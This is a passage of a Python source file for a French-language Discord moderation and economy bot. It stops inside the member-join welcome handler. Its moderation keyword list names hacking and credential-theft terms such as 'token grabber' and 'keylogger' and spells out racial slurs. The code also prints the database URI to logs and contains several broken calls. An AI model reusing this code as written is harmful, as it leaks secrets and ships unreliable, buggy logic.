import discord
from discord.ext import commands, tasks
from discord import app_commands, Embed, ButtonStyle, ui
from discord.ui import Button, View, Select, Modal, TextInput, button
from discord.ui import Modal, TextInput, Button, View
from discord.utils import get
from discord import TextStyle
from functools import wraps
import os
from discord import app_commands, Interaction, TextChannel, Role
import io
import random
import asyncio
import time
import re
import subprocess
import sys
import math
import traceback
from keep_alive import keep_alive
from datetime import datetime, timedelta
from collections import defaultdict, deque
import pymongo
from pymongo import MongoClient
from motor.motor_asyncio import AsyncIOMotorClient
import psutil
import pytz
import platform
from discord.ui import Select, View

token = os.environ['ETHERYA']
intents = discord.Intents.all()
start_time = time.time()
client = discord.Client(intents=intents)

#Configuration du Bot:
# --- ID Owner Bot ---
ISEY_ID = 792755123587645461

# --- ID Staff Serveur Delta ---
PROJECT_DELTA = 1359963854200639498
STAFF_PROJECT = 1359963854422933876
STAFF_DELTA = 1362339333658382488
ALERT_CHANNEL_ID = 1361329246236053586
ALERT_NON_PREM_ID = 1364557116572172288
STAFF_ROLE_ID = 1362339195380568085

# --- ID Sanctions Serveur Delta ---
WARN_LOG_CHANNEL = 1362435917104681230
UNWARN_LOG_CHANNEL = 1362435929452707910
BLACKLIST_LOG_CHANNEL = 1362435853997314269
UNBLACKLIST_LOG_CHANNEL = 1362435888826814586

# --- ID Gestion Delta ---
SUPPORT_ROLE_ID = 1359963854422933876
SALON_REPORT_ID = 1361362788672344290
ROLE_REPORT_ID = 1362339195380568085
TRANSCRIPT_CHANNEL_ID = 1361669998665535499

# --- ID Gestion Clients Delta ---
LOG_CHANNEL_RETIRE_ID = 1360864806957092934
LOG_CHANNEL_ID = 1360864790540582942

# --- ID Delta2 ---
ECO_ROLES_VIP = [1359963854402228315, 1361307897287675989]

# --- ID Etherya ---
AUTORIZED_SERVER_ID = 1034007767050104892

log_channels = {
    "sanctions": 1361669286833426473,
    "messages": 1361669323139322066,
    "utilisateurs": 1361669350054039683,
    "nicknames": 1361669502839816372,
    "roles": 1361669524071383071,
    "vocal": 1361669536197251217,
    "serveur": 1361669784814485534,
    "permissions": 1361669810496209083,
    "channels": 1361669826011201598,
    "webhooks": 1361669963835773126,
    "bots": 1361669985705132172,
    "tickets": 1361669998665535499,
    "boosts": 1361670102818230324
}

def get_log_channel(guild, key):
    log_channel_id = log_channels.get(key)
    if log_channel_id:
        return guild.get_channel(log_channel_id)
    return None

# Fonction pour créer des embeds formatés
def create_embed(title, description, color=discord.Color.blue(), footer_text=""):
    embed = discord.Embed(title=title, description=description, color=color)
    embed.set_footer(text=footer_text)
    return embed

# Connexion MongoDB
mongo_uri = os.getenv("MONGO_DB")  # URI de connexion à MongoDB
print("Mongo URI :", mongo_uri)  # Cela affichera l'URI de connexion (assure-toi de ne pas laisser cela en prod)
client = MongoClient(mongo_uri)
db = client['Cass-Eco2']

# Collections
collection = db['setup']  # Configuration générale ✅
collection2 = db['setup_premium']  # Serveurs premium ✅
collection3 = db['bounty']  # Primes et récompenses des joueurs ✅
collection4 = db['protection'] #Serveur sous secu ameliorer ✅
collection5 = db ['clients'] #Stock Clients ✅
collection6 = db ['partner'] #Stock Partner ❌
collection7= db ['sanction'] #Stock Sanction ✅
collection8 = db['idees'] #Stock Idées ✅
collection9 = db['stats'] #Stock Salon Stats ✅
collection10 = db['eco'] #Stock Les infos Eco ✅
collection11 = db['eco_daily'] #Stock le temps de daily ✅
collection12 = db['rank'] #Stock les Niveau ✅
collection13 = db['eco_work'] #Stock le temps de Work ✅
collection14 = db['eco_slut'] #Stock le temps de Slut ✅
collection15 = db['eco_crime'] #Stock le temps de Crime ✅
collection16 = db['ticket'] #Stock les Tickets
collection17 = db['team'] #Stock les Teams ✅
collection18 = db['logs'] #Stock les Salons Logs
collection19 = db['wl'] #Stock les whitelist ✅
collection20 = db['suggestions'] #Stock les Salons Suggestion ✅
collection21 = db['presentation'] #Stock les Salon Presentation ✅
collection22 = db['absence'] #Stock les Salon Absence ✅
collection23 = db['back_up'] #Stock les Back-up
collection24 = db['delta_warn'] #Stock les Warn Delta ✅
collection25 = db['delta_bl'] #Stock les Bl Delta ✅
collection26 = db['alerte'] #Stock les Salons Alerte ✅
collection27 = db['guild_troll'] #Stock les serveur ou les commandes troll sont actif ou inactif

# Fonction pour ajouter un serveur premium
def add_premium_server(guild_id: int, guild_name: str):
    collection2.update_one(
        {"guild_id": guild_id},
        {"$set": {"guild_name": guild_name}},
        upsert=True
    )

# --- Charger les paramètres du serveur dynamiquement ---
def load_guild_settings(guild_id: int) -> dict:
    # Récupère la configuration spécifique au serveur à partir de la base MongoDB
    return collection21.find_one({'guild_id': guild_id}) or {}

# Fonction pour ajouter ou mettre à jour une prime
def set_bounty(guild_id: int, user_id: int, prize: int):
    # Vérifie si le joueur a déjà une prime
    bounty_data = collection3.find_one({"guild_id": guild_id, "user_id": user_id})
    
    if bounty_data:
        # Si une prime existe déjà, on met à jour la prime et les récompenses
        collection3.update_one(
            {"guild_id": guild_id, "user_id": user_id},
            {"$set": {"prize": prize}},
        )
    else:
        # Sinon, on crée un nouveau document pour ce joueur
        collection3.insert_one({
            "guild_id": guild_id,
            "user_id": user_id,
            "prize": prize,
            "reward": 0  # Initialisation des récompenses à 0
        })

# Fonction pour récupérer les données d'un utilisateur
def get_user_eco(guild_id, user_id):
    user_data = collection10.find_one({"guild_id": guild_id, "user_id": user_id})
    if not user_data:
        # Si l'utilisateur n'a pas encore de données, on les crée
        collection10.insert_one({
            "guild_id": guild_id,
            "user_id": user_id,
            "coins": 0,
            "last_daily": None
        })
        return {"coins": 0, "last_daily": None}
    return user_data

# --- Fonction utilitaire pour récupérer le salon configuré ---
def get_presentation_channel_id(guild_id: int):
    data = collection21.find_one({"guild_id": guild_id})
    return data.get("presentation_channel") if data else None

def add_sanction(guild_id, user_id, action, reason, duration=None):
    sanction_data = {
        "guild_id": guild_id,
        "user_id": user_id,
        "action": action,
        "reason": reason,
        "duration": duration,
        "timestamp": datetime.datetime.utcnow()
    }

    # Insertion ou mise à jour de la sanction dans la base de données
    collection7.insert_one(sanction_data)

# Fonction pour récupérer le nombre de partenariats et le rank d'un utilisateur
def get_user_partner_info(user_id: str):
    partner_data = collection6.find_one({"user_id": user_id})
    if partner_data:
        return partner_data['rank'], partner_data['partnerships']
    return None, None

def get_premium_servers():
    """Récupère les IDs des serveurs premium depuis la base de données."""
    premium_docs = collection2.find({}, {"_id": 0, "guild_id": 1})
    return {doc["guild_id"] for doc in premium_docs}

def load_guild_settings(guild_id):
    # Charger les données de la collection principale
    setup_data = collection.find_one({"guild_id": guild_id}) or {}
    setup_premium_data = collection2.find_one({"guild_id": guild_id}) or {}
    bounty_data = collection3.find_one({"guild_id": guild_id}) or {}
    protection_data = collection4.find_one({"guild_id": guild_id}) or {}
    clients_data = collection5.find_one({"guild_id": guild_id}) or {}
    partner_data = collection6.find_one({"guild_id": guild_id}) or {}
    sanction_data = collection7.find_one({"guild_id": guild_id}) or {}
    idees_data = collection8.find_one({"guild_id": guild_id}) or {}
    stats_data = collection9.find_one({"guild_id": guild_id}) or {}
    eco_data = collection10.find_one({"guild_id": guild_id}) or {}
    eco_daily_data = collection11.find_one({"guild_id": guild_id}) or {}
    rank_data = collection12.find_one({"guild_id": guild_id}) or {}
    eco_work_data = collection13.find_one({"guild_id": guild_id}) or {}
    eco_slut_data = collection14.find_one({"guild_id": guild_id}) or {}
    eco_crime_data = collection15.find_one({"guild_id": guild_id}) or {}
    ticket_data = collection16.find_one({"guild_id": guild_id}) or {}
    team_data = collection17.find_one({"guild_id": guild_id}) or {}
    logs_data = collection18.find_one({"guild_id": guild_id}) or {}
    wl_data = collection19.find_one({"guild_id": guild_id}) or {}
    suggestions_data = collection20.find_one({"guild_id": guild_id}) or {}
    presentation_data = collection21.find_one({"guild_id": guild_id}) or {}
    absence_data = collection22.find_one({"guild_id": guild_id}) or {}
    back_up_data = collection23.find_one({"guild_id": guild_id}) or {}
    delta_warn_data = collection24.find_one({"guild_id": guild_id}) or {}
    delta_bl_data = collection25.find_one({"guild_id": guild_id}) or {}
    alerte_data = collection26.find_one({"guild_id": guild_id}) or {}
    guild_troll_data = collection27.find_one({"guild_id": guild_id}) or {}
    # Débogage : Afficher les données de setup
    print(f"Setup data for guild {guild_id}: {setup_data}")

    combined_data = {
        "setup": setup_data,
        "setup_premium": setup_premium_data,
        "bounty": bounty_data,
        "protection": protection_data,
        "clients": clients_data,
        "partner": partner_data,
        "sanction": sanction_data,
        "idees": idees_data,
        "stats": stats_data,
        "eco": eco_data,
        "eco_daily": eco_daily_data,
        "rank": rank_data,
        "eco_work": eco_work_data,
        "eco_slut": eco_slut_data,
        "eco_crime": eco_slut_data,
        "ticket": ticket_data,
        "team": team_data,
        "logs": logs_data,
        "wl": wl_data,
        "suggestions": suggestions_data,
        "presentation": presentation_data,
        "absence": absence_data,
        "back_up": back_up_data,
        "delta_warn": delta_warn_data,
        "delta_bl": delta_bl_data,
        "alerte": alerte_data,
        "guild_troll": guild_troll_data

    }

    return combined_data

async def get_protection_data(guild_id):
    # Récupère les données de protection dans la collection4
    data = collection4.find_one({"guild_id": str(guild_id)})
    return data or {}  # Retourne un dictionnaire vide si aucune donnée trouvée

# Fonction pour récupérer le préfixe depuis la base de données
async def get_prefix(bot, message):
    guild_data = collection.find_one({"guild_id": str(message.guild.id)})  # Récupère les données de la guilde
    return guild_data['prefix'] if guild_data and 'prefix' in guild_data else '+'

bot = commands.Bot(command_prefix=get_prefix, intents=intents, help_command=None)

# Dictionnaire pour stocker les paramètres de chaque serveur
GUILD_SETTINGS = {}
#------------------------------------------------------------------------- Code Protection:
# Dictionnaire en mémoire pour stocker les paramètres de protection par guild_id
protection_settings = {}
ban_times = {}  # Dictionnaire pour stocker les temps de bans

# Tâche de fond pour mettre à jour les stats toutes les 5 secondes
@tasks.loop(seconds=5)
async def update_stats():
    all_stats = collection9.find()

    for data in all_stats:
        guild_id = int(data["guild_id"])
        guild = bot.get_guild(guild_id)
        if not guild:
            continue

        role = guild.get_role(data.get("role_id"))
        member_channel = guild.get_channel(data.get("member_channel_id"))
        role_channel = guild.get_channel(data.get("role_channel_id"))
        bots_channel = guild.get_channel(data.get("bots_channel_id"))

        total_members = guild.member_count
        role_members = len([m for m in guild.members if role in m.roles and not m.bot]) if role else 0
        total_bots = len([m for m in guild.members if m.bot])

        try:
            if member_channel:
                await member_channel.edit(name=f"👥 Membres : {total_members}")
            if role_channel:
                await role_channel.edit(name=f"🎯 {role.name if role else 'Rôle'} : {role_members}")
            if bots_channel:
                await bots_channel.edit(name=f"🤖 Bots : {total_bots}")
        except discord.Forbidden:
            print(f"⛔ Permissions insuffisantes pour modifier les salons dans {guild.name}")
        except Exception as e:
            print(f"⚠️ Erreur lors de la mise à jour des stats : {e}")

# Tâche de fond pour donner des coins toutes les minutes en vocal
@tasks.loop(minutes=1)
async def reward_voice():
    for guild in bot.guilds:
        if guild.id == 1359963854200639498:
            for member in guild.members:
                if member.voice:
                    coins_to_add = random.randint(25, 75)
                    add_coins(guild.id, str(member.id), coins_to_add)

# Tâche de fond pour mettre à jour les XP en vocal toutes les 60 secondes
@tasks.loop(seconds=60)
async def update_voice_xp():
    for guild in bot.guilds:
        for vc in guild.voice_channels:
            for member in vc.members:
                if member.bot:
                    continue

                base_xp = xp_rate["voice"]
                if member.voice.self_video:
                    base_xp = xp_rate["camera"]
                elif member.voice.self_stream:
                    base_xp = xp_rate["stream"]

                update_user_xp(str(guild.id), str(member.id), base_xp)

# Événement quand le bot est prêt
@bot.event
async def on_ready():
    bot.add_view(TicketView(author_id=ISEY_ID))  # pour bouton "Passé Commande"
    bot.add_view(ClaimCloseView())               # pour "Claim" et "Fermer"
    print(f"✅ Le bot {bot.user} est maintenant connecté ! (ID: {bot.user.id})")

    bot.uptime = time.time()

    # Démarrer les tâches de fond
    update_stats.start()
    reward_voice.start()
    update_voice_xp.start()

    guild_count = len(bot.guilds)
    member_count = sum(guild.member_count for guild in bot.guilds)

    print(f"\n📊 **Statistiques du bot :**")
    print(f"➡️ **Serveurs** : {guild_count}")
    print(f"➡️ **Utilisateurs** : {member_count}")

    activity_types = [
        discord.Activity(type=discord.ActivityType.watching, name=f"{member_count} Membres"),
        discord.Activity(type=discord.ActivityType.streaming, name=f"{guild_count} Serveurs"),
        discord.Activity(type=discord.ActivityType.streaming, name="Project : Delta"),
    ]

    status_types = [discord.Status.online, discord.Status.idle, discord.Status.dnd]

    await bot.change_presence(
        activity=random.choice(activity_types),
        status=random.choice(status_types)
    )

    print(f"\n🎉 **{bot.user}** est maintenant connecté et affiche ses statistiques dynamiques avec succès !")
    print("📌 Commandes disponibles 😊")
    for command in bot.commands:
        print(f"- {command.name}")

    try:
        synced = await bot.tree.sync()
        print(f"✅ Commandes slash synchronisées : {[cmd.name for cmd in synced]}")
    except Exception as e:
        print(f"❌ Erreur de synchronisation des commandes slash : {e}")

    while True:
        for activity in activity_types:
            for status in status_types:
                await bot.change_presence(activity=activity, status=status)
                await asyncio.sleep(10)

        for guild in bot.guilds:
            GUILD_SETTINGS[guild.id] = load_guild_settings(guild.id)

@bot.event
async def on_error(event, *args, **kwargs):
    print(f"Une erreur s'est produite : {event}")
    embed = discord.Embed(
        title="❗ Erreur inattendue",
        description="Une erreur s'est produite lors de l'exécution de la commande. Veuillez réessayer plus tard.",
        color=discord.Color.red()
    )
    
    # Vérifie si args[0] est une Interaction
    if isinstance(args[0], discord.Interaction):
        await args[0].response.send_message(embed=embed)
    elif isinstance(args[0], discord.Message):
        # Si c'est un message, envoie l'embed dans le canal du message
        await args[0].channel.send(embed=embed)
    elif isinstance(args[0], discord.abc.GuildChannel):
        # Si c'est un canal de type GuildChannel, assure-toi que c'est un canal textuel
        if isinstance(args[0], discord.TextChannel):
            await args[0].send(embed=embed)
        else:
            # Si c'est un autre type de canal (comme un canal vocal), essaye de rediriger le message vers un canal textuel spécifique
            text_channel = discord.utils.get(args[0].guild.text_channels, name='ton-salon-textuel')
            if text_channel:
                await text_channel.send(embed=embed)
            else:
                print("Erreur : Aucun salon textuel trouvé pour envoyer l'embed.")
    else:
        print("Erreur : Le type de l'objet n'est pas pris en charge pour l'envoi du message.")

#------------------------------------------------------------------------- Commande Mention ainsi que Commandes d'Administration : Detections de Mots sensible et Mention

# Liste des mots sensibles
sensitive_words = [
    # Insultes graves
    "fils de pute", "enfoiré", "connard", "salopard", "bâtard", "déchet", "branleur", "crasseux", "charognard",
    
    # Discours haineux / discriminations
    "nigger", "nigga", "chintok", "bougnoule", "pédé", "negro", "race inférieure", 
    "sale arabe", "sale noir", "sale juif", "sale blanc", "retardé","enculé",
    
    # Termes liés à des idéologies haineuses
    "raciste", "homophobe", "xénophobe", "transphobe", "antisémite", "islamophobe", "suprémaciste", 
    "fasciste", "nazi", "néonazi", "dictateur", "extrémiste",
    
    # Violences et crimes graves
    "viol", "pédophilie", "inceste", "pédocriminel", "agression", "assassin", "meurtre", "génocide", 
    "extermination", "décapitation", "lynchage", "massacre", "torture", "suicidaire", "prise d'otage", 
    "terrorisme", "attentat", "bombardement", "exécution", "immolation", "traite humaine", "esclavage sexuel", 
    "viol collectif", "kidnapping",
    
    # Drogues & substances
    "cocaïne", "héroïne", "crack", "LSD", "ecstasy", "GHB", "fentanyl", "méthamphétamine", 
    "cannabis", "opium", "drogue", "drogue de synthèse", "trafic de drogue", "toxicomanie", "overdose",
    
    # Contenus sexuels explicites
    "pornographie", "porno", "prostitution", "masturbation", "fellation", "sexe", "sodomie", 
    "exhibition", "fétichisme", "orgie", "gode", "pénétration", "nu",
    
    # Fraudes & crimes financiers
    "scam", "fraude", "chantage", "extorsion", "évasion fiscale", "fraude fiscale", "détournement de fonds",
    
    # Groupes & activités criminelles
    "mafia", "cartel", "crime organisé", "milice", "mercenaire", "guérilla", "terroriste", "insurrection", 
    "émeute", "séparatiste",
    
    # Propagande et manipulation
    "endoctrinement", "secte", "lavage de cerveau", "désinformation", "propagande",
    
    # Attaques et menaces
    "raid", "ddos", "dox", "doxx", "hack", "hacking", "botnet", "nuke", "nuker", "crash bot", "flood", "spam", "booter", "keylogger", "phishing", "malware", "trojan",

    # Raids Discord
    "mass ping", "raid bot", "join raid", "leaver bot", "spam bot", "token grabber", "auto join", "multi account", "alt token",

    # Harcèlement et haine
    "swat", "swatting", "harass", "threaten", "kill yourself", "kys", "suicide", "death threat", "pedo", "grooming", "cp",
]

user_messages = {}
cooldowns = {}

# Fonction pour générer une regex flexible
def make_flexible_pattern(word):
    # Autorise espaces, tirets, underscores ou points entre les mots
    parts = word.split()
    return r"[\s\-_\.]*".join(re.escape(part) for part in parts)

@bot.event
async def on_message(message):
    try:
        if message.author.bot or message.guild is None:
            return

        user_id = str(message.author.id)

        # 🚫 0. Blacklist : ignore tous les messages sauf si mot sensible
        blacklisted = collection25.find_one({"user_id": user_id})
        if blacklisted:
            for word in sensitive_words:
                if re.search(rf"\b{re.escape(word)}\b", message.content, re.IGNORECASE):
                    print(f"🚨 Mot sensible détecté (blacklisté) dans le message de {message.author}: {word}")
                    asyncio.create_task(send_alert_to_admin(message, word))
                    break
            return

        # 💬 1. Vérifie les mots sensibles
        for word in sensitive_words:
            if re.search(rf"\b{re.escape(word)}\b", message.content, re.IGNORECASE):
                print(f"🚨 Mot sensible détecté dans le message de {message.author}: {word}")
                asyncio.create_task(send_alert_to_admin(message, word))
                break

        # 📣 2. Répond si le bot est mentionné
        if bot.user.mentioned_in(message) and message.content.strip().startswith(f"<@{bot.user.id}>"):
            avatar_url = bot.user.avatar.url if bot.user.avatar else None

            embed = discord.Embed(
                title="👋 Besoin d’aide ?",
                description=(
                    f"Salut {message.author.mention} ! Moi, c’est **{bot.user.name}**, ton assistant sur ce serveur. 🤖\n\n"
                    "🔹 **Pour voir toutes mes commandes :** Appuie sur le bouton ci-dessous ou tape `+help`\n"
                    "🔹 **Une question ? Un souci ?** Contacte le staff !\n\n"
                    "✨ **Profite bien du serveur et amuse-toi !**"
                ),
                color=discord.Color.blue()
            )
            embed.set_thumbnail(url=avatar_url)
            embed.set_footer(text="Réponse automatique • Disponible 24/7", icon_url=avatar_url)

            view = View()
            button = Button(label="📜 Voir les commandes", style=discord.ButtonStyle.primary)

            async def button_callback(interaction: discord.Interaction):
                ctx = await bot.get_context(interaction.message)
                await ctx.invoke(bot.get_command("help"))
                await interaction.response.send_message("Voici la liste des commandes !", ephemeral=True)

            button.callback = button_callback
            view.add_item(button)

            await message.channel.send(embed=embed, view=view)
            return

        # ⚙️ 4. Configuration sécurité
        guild_data = collection.find_one({"guild_id": str(message.guild.id)})
        if not guild_data:
            await bot.process_commands(message)
            return

        # 🔗 5. Anti-lien
        if guild_data.get("anti_link", False):
            if "discord.gg" in message.content and not message.author.guild_permissions.administrator:
                # Vérification de la whitelist
                whitelist_data = await collection19.find_one({"guild_id": str(message.guild.id)})
                wl_ids = whitelist_data.get("users", []) if whitelist_data else []

                if str(message.author.id) in wl_ids:
                    print(f"[Anti-link] Message de {message.author} ignoré (whitelist).")
                    return

                await message.delete()
                await message.author.send("⚠️ Les liens Discord sont interdits sur ce serveur.")
                return

        # 💣 6. Anti-spam
        if guild_data.get("anti_spam_limit"):
            # Vérification de la whitelist
            whitelist_data = await collection19.find_one({"guild_id": str(message.guild.id)})
            wl_ids = whitelist_data.get("users", []) if whitelist_data else []

            if str(message.author.id) in wl_ids:
                print(f"[Anti-spam] Message de {message.author} ignoré (whitelist).")
                return

            now = time.time()
            uid = message.author.id
            user_messages.setdefault(uid, []).append(now)

            recent = [t for t in user_messages[uid] if t > now - 5]
            user_messages[uid] = recent

            if len(recent) > 10:
                await message.guild.ban(message.author, reason="Spam excessif")
                return

            per_minute = [t for t in recent if t > now - 60]
            if len(per_minute) > guild_data["anti_spam_limit"]:
                await message.delete()
                await message.author.send("⚠️ Vous envoyez trop de messages trop rapidement. Réduisez votre spam.")
                return

        # 📣 7. Anti-everyone
        if guild_data.get("anti_everyone", False):
            if "@everyone" in message.content or "@here" in message.content:
                # Vérification de la whitelist
                whitelist_data = await collection19.find_one({"guild_id": str(message.guild.id)})
                wl_ids = whitelist_data.get("users", []) if whitelist_data else []

                if str(message.author.id) in wl_ids:
                    print(f"[Anti-everyone] Message de {message.author} ignoré (whitelist).")
                    return

                await message.delete()
                await message.author.send("⚠️ L'utilisation de `@everyone` ou `@here` est interdite sur ce serveur.")
                return

        # 🎉 8. Coins pour chaque message
        if message.guild.id == 1359963854200639498:
            coins_to_add = random.randint(3, 5)
            add_coins(message.guild.id, user_id, coins_to_add)

        # 🔄 9. Cooldown XP
        now = datetime.utcnow()
        if user_id not in cooldowns or now > cooldowns[user_id]:
            update_user_xp(str(message.guild.id), user_id, xp_rate["message"])
            cooldowns[user_id] = now + timedelta(seconds=60)

        # ✅ 10. Traitement normal
        await bot.process_commands(message)

    except Exception:
        print("❌ Erreur dans on_message :")
        traceback.print_exc()


class UrgencyClaimView(View):
    def __init__(self, message, detected_word):
        super().__init__(timeout=None)
        self.message = message
        self.detected_word = detected_word
        self.claimed_by = None
        self.message_embed = None

        claim_btn = Button(label="🚨 Claim Urgence", style=discord.ButtonStyle.danger)
        claim_btn.callback = self.claim_urgence
        self.add_item(claim_btn)

    async def claim_urgence(self, interaction: discord.Interaction):
        if STAFF_ROLE_ID not in [r.id for r in interaction.user.roles]:
            await interaction.response.send_message("Tu n'as pas la permission de claim cette alerte.", ephemeral=True)
            return

        self.claimed_by = interaction.user
        self.clear_items()

        self.message_embed.add_field(name="🛡️ Claimed par", value=self.claimed_by.mention, inline=False)

        prevenir_btn = Button(label="📨 PRÉVENIR ISEY", style=discord.ButtonStyle.primary)
        prevenir_btn.callback = self.prevenir_isey
        self.add_item(prevenir_btn)

        await interaction.response.edit_message(embed=self.message_embed, view=self)

    async def prevenir_isey(self, interaction: discord.Interaction):
        isey = interaction.client.get_user(ISEY_ID)
        if isey:
            try:
                await isey.send(
                    f"🚨 **Alerte claimée par {self.claimed_by.mention}**\n"
                    f"Serveur : **{self.message.guild.name}**\n"
                    f"Lien du message : {self.message.jump_url}"
                )
            except Exception as e:
                print(f"❌ Erreur MP Isey : {e}")

        await interaction.response.send_message(f"<@{ISEY_ID}> a été prévenu !", ephemeral=True)


async def send_alert_to_admin(message, detected_word):
    try:
        print(f"🔍 Envoi d'alerte déclenché pour : {message.author} | Mot détecté : {detected_word}")

        # Charger les paramètres du serveur pour vérifier s'il est premium
        premium_data = collection2.find_one({"guild_id": message.guild.id})
        is_premium = premium_data is not None

        # Déterminer le bon salon selon le statut premium
        target_channel_id = ALERT_CHANNEL_ID if is_premium else ALERT_NON_PREM_ID
        channel = message.guild.get_channel(target_channel_id)

        # Si le salon n'existe pas sur le serveur de l'alerte, chercher dans le serveur de secours
        if not channel:
            print("⚠️ Salon d'alerte introuvable sur ce serveur, recherche dans le serveur principal.")
            fallback_guild = bot.get_guild(1359963854200639498)
            if fallback_guild:
                channel = fallback_guild.get_channel(target_channel_id)
            if not channel:
                print("❌ Aucun salon d'alerte trouvé même dans le fallback.")
                return

        # Créer l'embed d'alerte
        embed = discord.Embed(
            title="🚨 Alerte : Mot sensible détecté !",
            description=f"Un message contenant un mot interdit a été détecté sur **{message.guild.name}**.",
            color=discord.Color.red(),
            timestamp=datetime.utcnow()
        )
        embed.add_field(name="📍 Salon", value=message.channel.mention, inline=True)
        embed.add_field(name="👤 Auteur", value=f"{message.author.mention} ({message.author.id})", inline=True)
        embed.add_field(name="⚠️ Mot détecté", value=detected_word, inline=True)

        content = message.content
        if len(content) > 900:
            content = content[:900] + "..."
        embed.add_field(name="💬 Message", value=f"```{content}```", inline=False)

        if hasattr(message, "jump_url"):
            embed.add_field(name="🔗 Lien", value=f"[Clique ici]({message.jump_url})", inline=False)

        embed.add_field(name="🌐 Serveur", value=f"[{message.guild.name}](https://discord.com/channels/{message.guild.id})", inline=False)

        avatar = bot.user.avatar.url if bot.user.avatar else None
        embed.set_footer(text="Système de détection automatique", icon_url=avatar)

        view = UrgencyClaimView(message, detected_word)
        view.message_embed = embed

        # Envoi de l'alerte (avec mention pour les premium)
        if is_premium:
            await channel.send("<@&1362339333658382488> 🚨 Un mot sensible a été détecté !")
        await channel.send(embed=embed, view=view)

    except Exception as e:
        print(f"⚠️ Erreur envoi alerte : {e}")
        traceback.print_exc()
#-------------------------------------------------------------------------- Bot Event:

@bot.event
async def on_message_delete(message):
    if message.author.bot:
        return  # Ignore les messages de bots

    # Fonctionnalité de snipe
    channel_id = message.channel.id
    timestamp = time.time()

    if channel_id not in sniped_messages:
        sniped_messages[channel_id] = deque(maxlen=10)  # Jusqu'à 10 messages par salon

    sniped_messages[channel_id].append((timestamp, message.author, message.content))

    # Nettoyage après 5 minutes
    async def cleanup():
        await asyncio.sleep(300)
        now = time.time()
        sniped_messages[channel_id] = deque([
            (t, a, c) for t, a, c in sniped_messages[channel_id] if now - t < 300
        ])

    bot.loop.create_task(cleanup())

    # Log du message supprimé (si sur le serveur PROJECT_DELTA)
    if message.guild and message.guild.id == PROJECT_DELTA:
        log_channel = get_log_channel(message.guild, "messages")
        if log_channel:
            embed = discord.Embed(
                title="🗑️ Message Supprimé",
                description=f"**Auteur :** {message.author.mention}\n**Salon :** {message.channel.mention}",
                color=discord.Color.red()
            )
            if message.content:
                embed.add_field(name="Contenu", value=message.content, inline=False)
            else:
                embed.add_field(name="Contenu", value="*Aucun texte (peut-être un embed ou une pièce jointe)*", inline=False)

            embed.set_footer(text=f"ID de l'utilisateur : {message.author.id}")
            embed.timestamp = message.created_at

            await log_channel.send(embed=embed)

@bot.event
async def on_message_edit(before, after):
    if before.guild and before.guild.id == PROJECT_DELTA and before.content != after.content:
        channel = get_log_channel(before.guild, "messages")
        if channel:
            embed = discord.Embed(
                title="✏️ Message Édité",
                description=f"**Auteur :** {before.author.mention}\n**Salon :** {before.channel.mention}",
                color=discord.Color.orange()
            )
            embed.add_field(name="Avant", value=before.content or "*Vide*", inline=False)
            embed.add_field(name="Après", value=after.content or "*Vide*", inline=False)
            embed.set_footer(text=f"ID de l'utilisateur : {before.author.id}")
            embed.timestamp = after.edited_at or discord.utils.utcnow()

            await channel.send(embed=embed)

@bot.event
async def on_member_join(member):
    guild_id = str(member.guild.id)

    # Récupérer les données de protection pour le serveur
    protection_data = await get_protection_data(guild_id)

    # Vérifier si l'anti-bot est activé dans la base de données
    if protection_data.get("anti_bot") == "activer":
        # Vérifier si le membre est un bot
        if member.bot:
            # Récupérer les données de la whitelist des bots
            whitelist_data = await collection19.find_one({"guild_id": guild_id})  # Utilisation de la collection19 pour la whitelist

            # Vérifier si le bot est dans la whitelist
            if whitelist_data and str(member.id) in whitelist_data.get("bots", []):
                print(f"[Protection Anti-Bot] Le bot {member} est dans la whitelist, aucune action entreprise.")
                return  # Ignorer le bot s'il est dans la whitelist

            try:
                # Si ce n'est pas un bot whitelisté, on le kick ou le ban selon les permissions
                if member.guild.me.guild_permissions.ban_members:
                    await member.ban(reason="Bot détecté et banni car l'anti-bot est activé.")
                    print(f"[Protection Anti-Bot] {member} a été banni car c'est un bot et l'anti-bot est activé.")
                elif member.guild.me.guild_permissions.kick_members:
                    await member.kick(reason="Bot détecté et kické car l'anti-bot est activé.")
                    print(f"[Protection Anti-Bot] {member} a été kické car c'est un bot et l'anti-bot est activé.")
                else:
                    print(f"[Protection Anti-Bot] Le bot n'a pas les permissions nécessaires pour bannir ou kick {member}.")
            except discord.Forbidden:
                print(f"[Protection Anti-Bot] Le bot n'a pas les permissions pour bannir ou kick {member}.")
            except Exception as e:
                print(f"[Protection Anti-Bot] Erreur lors du traitement du bot : {e}")
            return  # Arrêter l'exécution du reste du code si c'est un bot et que l'anti-bot est activé

    # Vérifie si le membre a rejoint le serveur Project : Delta
    PROJECT_DELTA = 1359963854200639498
    if member.guild.id == PROJECT_DELTA:
        # Salon de bienvenue avec mention
        welcome_channel_id = 1359963854892957893  # Salon spécifique de bienvenue
        welcome_channel = bot.get_channel(welcome_channel_id)

        # Premier message de bienvenue (mention de la personne qui a rejoint)
        await welcome_channel.send(f"Bienvenue {member.mention} ! 🎉")

        # Création de l'embed pour Project : Delta
        embed = discord.Embed(
            title="<a:fete:1172810362261880873> **Bienvenue sur Project : Delta !** <a:fete:1172810362261880873>",
            description=(
                "<a:pin:1172810912386777119> Ce serveur est dédié au **support du bot Project : Delta** ainsi qu’à tout ce qui touche à la **création de bots Discord**, **serveurs sur-mesure**, **sites web**, et **services de graphisme**. **Tout est là pour t’accompagner dans tes projets !**\n\n"
                "<a:Anouncements_Animated:1355647614133207330> **Avant de démarrer, voici quelques infos essentielles :**\n\n"
                "<a:fleche2:1290296814397816927> ⁠︱** <#1359963854892957892> ** pour éviter les mauvaises surprises.\n"
                "<a:fleche2:1290296814397816927> ⁠︱** <#1360365346275459274> ** pour bien comprendre comment utiliser le bot Project : Delta.\n"
                "<a:fleche2:1290296814397816927> ⁠︱** <#1361710727986937877> ** pour découvrir nos services et produits.\n\n"
                "<a:emojigg_1:1355608239835844850> **Tu rencontres un problème ou tu as une question ?** Ouvre un ticket, notre équipe de support est là pour t’aider !\n\n"
                "Prêt à faire évoluer tes projets avec **Project : Delta** ? <a:fete:1172810362261880873>"
            ),
            color=discord.Color.blue()
        )
        embed.set_image(url="https://github.com/Iseyg91/KNSKS-ET/blob/3702f708294b49536cb70ffdcfc711c101eb0598/IMAGES%20Delta/uri_ifs___M_ff5898f7-21fa-42c9-ad22-6ea18af53e80.jpg?raw=true")

        # Envoi de l'embed pour Project : Delta
        await welcome_channel.send(embed=embed)

        # Salon du comptage des membres
        member_count_channel_id = 1360904472456593489  # Salon pour le comptage des membres
        member_count_channel = bot.get_channel(member_count_channel_id)

        # Message de comptage des membres
